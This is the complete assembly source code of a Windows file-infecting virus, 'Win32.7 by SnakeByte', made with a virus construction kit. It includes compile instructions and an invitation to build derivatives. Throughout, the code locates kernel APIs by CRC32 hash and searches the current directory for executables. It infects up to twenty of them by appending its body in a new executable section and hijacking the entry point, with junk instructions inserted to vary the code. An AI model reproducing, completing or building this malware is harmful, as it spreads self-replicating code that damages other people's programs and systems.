              
;
;
; Win32.7 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.7
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 7
;  Infection Type         : adding a new section 
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 16
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; mov eax, -1
 mov eax, ( -1d xor 2d )
 xor eax, 2d
 and eax, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, [eax+3Ch]
 add esi, eax
                                        ; get File Alignment
                                        ; add esi, 60
 dec esi
 mov dword ptr [ebp+Trash1], ebx        ; Trash
 add esi, 61d
 mov edx, [esi]
 add esi, -60d
 mov dword ptr [ebp+filealign], 0
 xor dword ptr [ebp+filealign], edx
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edi, dword ptr [esi+3Ch]
 add edi, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], edi
                                        ; get old Entrypoint
 mov ecx, dword ptr [edi+28h]
 mov dword ptr [ebp+OldEIP], ecx
 mov ebx, dword ptr [edi+34h]
 mov dword ptr [ebp+OldBase], ebx
 rcl edx, 7d                            ; Trash
 mov edx, [edi+38h]
 mov dword ptr [ebp+sectionalign], 0
 adc ecx, 13249890d                     ; Trash
 xor dword ptr [ebp+sectionalign], edx
                                        ; Get last section
 mov edx, [edi+74h]
 shl edx, 3
                                        ; clear ebx
 sub ebx, ebx
 mov bx, word ptr [edi+6h]
 mov ecx, 28h
 pushad
 mov eax, ebx
 mul ecx
 mov dword ptr [ebp+Misc1], -1
 and dword ptr [ebp+Misc1], eax
 popad
 mov ebx, dword ptr [ebp+Misc1]
 add edi, 78h
 add edi, edx
 add edi, ebx
 mov ecx, ebp
 add ecx, offset newsection


 xchg ecx, edi
 push ecx
                                        ; Calculate the RVA of the new section
 mov eax, [ecx-5*8+8d]
 add eax, [ecx-5*8+12d]
 mov edx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], eax
 mov dword ptr [ebp+AlignReg2], edx
 mov dword ptr [ebp+nsphysicalsize], eax
 Call Align
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], eax
                                        ;  calculate the virtual size of the new section
 mov eax, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], eax
 Call Align
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], eax
                                        ; calculate physical offset
 mov eax,[ecx-5*8+20d]
 add eax,[ecx-5*8+16d]
 mov ebx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], eax
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], ebx
 Call Align
                                        ; mov edx, -1
 mov edx, -1d
 and edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], edx
                                        ; calculate new size
 mov ecx, dword ptr [ebp+filealign]
 mov eax, edx
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], ecx
 add eax, VirusSize
 sal ebx, 21d                           ; Trash
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], eax
 call Align
                                        ; clear eax
 mov eax, 0
 xor eax, dword ptr [ebp+AlignReg1]
 sub dword ptr [ebp+Trash1], 1149135    ; Trash
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], eax
 pushad
 shr ebx, 23d                           ; Trash
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], -1
 and dword ptr [ebp+WFD_nFileSizeLow], eax
 shr edx, 19d                           ; Trash
 call CreateMap
 jc NoEXE
                                        ; mov eax, 16
 mov eax, ( 16d + 21d )
 sub eax, 21d
 pop esi
 lea ebx, [ebp+newsection]
 xchg edi, ebx

WriteNewSectionLoop:
 push dword ptr [edi]
 pop dword ptr [esi]
                                        ; add edi, 4
 add edi, 4d
                                        ; add esi, 4
 dec esi
 rcl edx, 20d                           ; Trash
 add esi, 5d
 sub eax, 1
 test eax, eax
 jnz WriteNewSectionLoop
                                        ; increase section numbers
                                        ; clear ecx
 sub ecx, ecx
 add ecx, dword ptr [ebp+PEheader]
 add word ptr [ecx+06h], 1
 mov eax, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], eax
                                        ; set new EIP
 mov dword ptr  [ecx+28h], eax
                                        ; set infection mark
 mov dword ptr [ecx+4Ch], -1d
 and dword ptr [ecx+4Ch], '7'
 mov eax, dword ptr [ebp+nsphysicaloffset]
 push eax
                                        ; Append Virus
 pop edi
 lea edx, [ebp+Virus]
 xchg edx, esi

 mov eax, VirusSize
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec eax
 jnz AppendLoop
 neg ecx                                ; Trash
                                        ; decrease Infection Counter
 mov ebx, dword ptr [ebp+InfCounter]
 add ebx, -1
 mov dword ptr [ebp+InfCounter], -1
 and dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 pop edx
 stc
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov ecx, offset WIN32_FIND_DATA
 add ecx, ebp

 push ecx
 push eax
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov eax, 276
 mov eax, ( 276d xor 7d )
 xor eax, 7d
 mov edx, offset WFD_szFileName
 add edx, ebp


ClearOldData2:
 sub ecx, 59899234d                     ; Trash
 mov byte ptr [edx], 0h
                                        ; add edx, 1
 sub edx, -1d
 dec eax
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]

 push ebx
 mov ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret





;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov eax, dword ptr [ebp+OldBase]

 push eax
 pop dword ptr [ebp+retBase]

 mov edx, dword ptr [ebp+OldEIP]

 push edx
 pop dword ptr [ebp+retEIP]

 sal ecx, 27d                           ; Trash


ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 inc ebp
 dec ebp
 jz FirstGenHost
 mov ebx,12345678h
 org $-4
 retEIP dd 0h
 add ebx,12345678h
 org $-4
 retBase dd 0h
 jmp ebx



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edi Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




                                        ; clear ebx
 mov ebx, 45423d
 sub ebx, 45423d
 xor ebx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push ebx
                                        ; clear eax
 and eax, 0
 xor eax, dword ptr [ebp+KernelMZ]
 add eax, dword ptr [ebx]
                                        ; mov ebx, eax
 push eax
 pop ebx
                                        ; mov edx, ebx
 mov edx, ebx
 push edx
 push edi
 cld

                                        ; edx Points to API-Name ( Kernel )
                                        ; edi Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
 mov ecx, dword ptr [ebp+APICRC32]
 sub ecx, dword ptr [edi]
 or ecx, ecx
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop edi
 pop edx
 pop ebx
                                        ; add ebx, 4
 add ebx, 4d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 12d
                                        ; retrieve the offset
 movzx edx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 xchg edx, eax
                                        ; clear edx
 and edx, 0
 mov dx, word ptr [eax]
 clc
 rcl edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov eax, dword ptr [ebp+KernelMZ]
 add eax, dword ptr [edx]
 mov dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop eax
 popad
 jmp ExecuteHost



;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov edi, edx
 mov edi, edx
                                        ; mov ebx, edx
 mov ebx, edx
LenCRC:
                                        ; add ebx, 1
 inc ebx
 cmp byte ptr [ebx], 0
 jne LenCRC
 sub ebx, edi
                                        ; mov esi, ebx
 mov esi, ebx
                                        ; add esi, 1
 sub esi, -1d
 cld
                                        ; clear eax
 mov eax, 0
 add eax, -1
                                        ; mov edx, eax
 mov edx, eax
NextByteCRC:
                                        ; clear ebx
 and ebx, 0
                                        ; clear ecx
 xor ecx, ecx
 mov bl, byte ptr [edi]
                                        ; add edi, 1
 sub edi, -1d
 xor bl, al
 mov al, ah
 mov ah, dl
 mov dl, dh
 mov dh, 8
NextBitCRC:
 shr cx, 1
 rcr bx, 1
jnc NoCRC
 xor bx,08320h
 xor cx,0EDB8h
NoCRC:
 dec dh
jnz NextBitCRC
 xor eax, ebx
 xor edx, ecx
 dec esi
jnz NextByteCRC
 not edx
 not eax
 mov ebx, edx
 rol ebx, 16d
 mov bx, ax
 mov dword ptr [ebp+APICRC32], 0
 xor dword ptr [ebp+APICRC32], ebx
 popad
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov ecx, dword ptr [esp]
                                        ; round to pages
 xor cx, cx
                                        ; add ecx, 1
 add ecx, 1d
GetKernelLoop:
                                        ; clear edx
 xor edx, edx
 add ecx, -1
 mov dx, word ptr [ecx+03ch]
 cmp dx,0f800h
 je GetKernelLoop
 cmp ecx, dword ptr [ecx+edx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], ecx
                                        ; add ecx, 60
 add ecx, 60d
 or eax, ecx                            ; Trash
 mov ebx, [ecx]
 inc ecx
 sub ecx, 61d
 add ebx, ecx
 mov [KernelPE+ebp], ebx
 mov eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov ebx, [eax+78h]
 and ecx, ebx                           ; Trash
 add ebx, [ebp+KernelMZ]
                                        ; add ebx, 28
 add ebx, 28d
                                        ; get ATableVA
 mov eax, dword ptr [ebx]
 add eax, [ebp+KernelMZ]
                                        ; add ebx, 4
 add ebx, 4d
 mov dword ptr [ebp+ATableVA], eax
                                        ; get NTableVA
 mov eax, dword ptr [ebx]
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], eax
                                        ; get OTableVA
 mov eax, dword ptr [ebx]
 adc edx, ebx                           ; Trash
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax
 jmp GetApis

;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 mov edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edi

                                        ; mov ecx, -1
 mov ecx, ( -1d + 27d )
 sub ecx, 27d
 and ecx, dword ptr [ebp+Trash1]

 mov dword ptr [ebp+Trash2], ecx

 mov eax, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], eax




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea ebx, [ebp+filemask]
 xchg eax, ebx

                                        ; Set Infection Counter
                                        ; mov edi, 20
 mov edi, ( 20d + 11d )
 sub edi, 11d
 mov dword ptr [ebp+InfCounter], edi
                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp edx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je Goodfile
                                        ; mov ebx, 846
 mov ebx, ( 846d + 28d )
 sub ebx, 28d
 cmp ebx, 846d
 je Notagoodfile

Goodfile:
 cmp word ptr [ecx+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 push dword ptr [ecx+3Ch]
 pop eax
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],eax
 jb Notagoodfile
 add eax, ecx
                                        ; check for PE Header
                                        ; check for EP
 movzx ebx, word ptr [eax]
 cmp ebx, 'EP'
 je Goodfile2
                                        ; clear edx
 and edx, 0
 cmp edx, 0
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [eax+4Ch], '7'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for OBJ
 mov dx, word ptr [eax+16h]
 and dx, 00002h
 cmp dx, 00002h
 jne Notagoodfile
 or ebx, edx                            ; Trash
 call InfectEXE                         ; Infect the file
 jc NoInfection
 sar ebx, 24d                           ; Trash

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 ror ebx, 10d                           ; Trash
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 mov edx, 0
 mov dword ptr [ebp+AlignTemp], eax
 div ecx
 sub ecx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 mov edx, NumberOfApis

                                        ; load API Names and Offsets
 lea ecx, [ebp+APIOffsets]
 xor ebx, 76766737d                     ; Trash
 xchg ecx, eax

 lea edi, [ebp+APINames]


GetApisLoop: 
 sar ecx, 8d                            ; Trash
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

                                        ; search 'em
                                        ; edi points to the CRC
                                        ; eax points to the offset

 call SearchAPI1
                                        ; add edi, 4
 inc edi
 add edi, 3d
 push dword ptr [ebp+TempAPI]
 pop ecx
 mov dword ptr [eax], 0
 add dword ptr [eax], ecx
                                        ; add eax, 4
 add eax, 4d
 mov ebx, ecx                           ; Trash
 dec edx
 jnz GetApisLoop
 jmp Outbreak



;                  [ ///// * Data * \\\\\ ]

Data:
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 NTableVA    dd 0h
 InfCounter  dd 0h
 NewSize     dd 0h
 APICRC32    dd 0h
 sectionalign   dd 0h
 TempAPI     dd 0h
 NewEIP      dd 0h
 counter     dw 0h
 filealign   dd 0h
 OTableVA    dd 0h
 Trash1      dd 0h

 APINames:
 dd 0797B49ECh           ; MapViewOfFile
 dd 08C892DDFh           ; CreateFileA
 dd 096B2D96Ch           ; CreateFileMappingA
 dd 0AA700106h           ; FindNextFileA
 dd 0AE17EBEFh           ; FindFirstFileA
 dd 068624A9Dh           ; CloseHandle
 dd 094524B42h           ; UnmapViewOfFile
 dd 0C200BE21h           ; FindClose


 APIOffsets:
 XMapViewOfFile         dd 0h
 XCreateFileA           dd 0h
 XCreateFileMappingA    dd 0h
 XFindNextFileA         dd 0h
 XFindFirstFileA        dd 0h
 XCloseHandle           dd 0h
 XUnmapViewOfFile       dd 0h
 XFindClose             dd 0h

 AlignReg1   dd 0h
 FindHandle  dd 0h
 AlignReg2   dd 0h
 OldBase     dd 400000h
 MapHandle   dd 0h
 Trash2      dd 0h
 Misc1       dd 0h
 MapAddress  dd 0h
 db 'Win32.7 of SnakeByte',0
 AlignTemp   dd 0h
 OldEIP      dd 0h

 FileHandle  dd 0h
 KernelMZ    dd 0h
 ATableVA    dd 0h
 filemask    db '*.exe',0
newsection:                           ; Settings for the new section
 nsname           db '.RqxSXUi'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 PEheader    dd 0h
 KernelPE    dd 0h




;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 ror eax, 3d                            ; Trash
 mov edx, 80000000h or 40000000h
 sub eax, ebx                           ; Trash
 push edx
 mov ebx, ebp
 add ebx, offset WFD_szFileName

 push ebx
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], 0
 xor dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx
 rol ebx, 1d                            ; Trash

                                        ; clear edx
 sub edx, edx
 push edx
 push ecx
 push edx
 push 00000004h
 push edx
 xor ebx, edx                           ; Trash
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ecx
                                        ; add eax, 1
 add eax, 1d
 dec eax
 jz CloseFile
                                        ; clear edx
 and edx, 0
 push ecx
 push edx
 push edx
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 test eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret
 not edx                                ; Trash

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 sal ebx, 13d                           ; Trash
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear ecx
 mov ecx, 0
 push ecx
 call ExitProcess



end FakeCode

